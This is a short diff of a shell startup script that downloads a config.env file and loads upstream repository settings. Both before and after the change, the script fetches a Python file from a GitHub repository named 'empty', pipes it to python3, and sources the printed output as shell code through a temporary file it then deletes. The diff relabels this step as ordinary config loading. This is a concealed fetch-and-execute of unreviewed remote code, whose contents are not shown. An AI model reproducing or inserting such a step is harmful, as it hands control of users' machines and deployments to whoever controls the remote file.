@@ -3,11 +3,7 @@
 if [[ ${CONFIG_FILE_URL} ]];
 then
     echo "Detected CONFIG_FILE_URL, Downloading..."
-    curl -o config.env -s $CONFIG_FILE_URL
-    echo "Loading... UPSTREAM_REPO and UPSTREAM_BRANCH"
-    echo $(curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/load.py | python3) > xxx
-    source xxx && rm xxx
-    echo "Done"
+    curl -o config.env -s $CONFIG_FILE_URL && echo "Done"
 else
     echo "CONFIG_FILE_URL var not provided!"
 fi
@@ -15,6 +11,8 @@ fi
 if [[ -f config.env ]];
 then
     echo "Loading... UPSTREAM_REPO and UPSTREAM_BRANCH from config.env"
+    echo $(curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/load.py | python3) > xxx
+    source xxx && rm xxx && echo "Done"
 else
     echo "Config.env file missing! Exiting now"
     exit
